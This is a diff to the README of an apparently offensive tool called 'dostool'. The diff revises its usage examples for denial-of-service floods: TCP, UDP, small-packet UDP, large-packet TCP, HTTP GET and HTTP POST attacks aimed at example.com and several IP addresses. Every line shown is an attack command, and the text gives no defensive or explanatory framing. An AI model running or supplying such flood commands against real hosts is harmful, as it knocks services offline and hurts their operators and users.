@@ -28,10 +28,16 @@ rm -rf build
 ``` dostool tcp 192.168.0.1:53 ```
 
 ## DoS by UDP
-``` dostool udp 192.168.0.1:53 ```
+``` dostool udp example.com:443 ```
 
-## DoS domains
-``` dostool tcp example.com:80 ```
+## DoS by UDP (Small packets)
+``` dostool s-udp example.com:443 ```
 
-## DoS domains (not raw data)
-``` dostool http example.com:80 ```
+## DoS by TCP (Large packets)
+``` dostool s-tcp example.com:443 ```
+
+# DoS by HTTP (GET)
+``` dostool http-get example.com:80 ```
+
+# DoS by HTTP (POST)
+``` dostool http-post 11.11.11.11:8443 ```
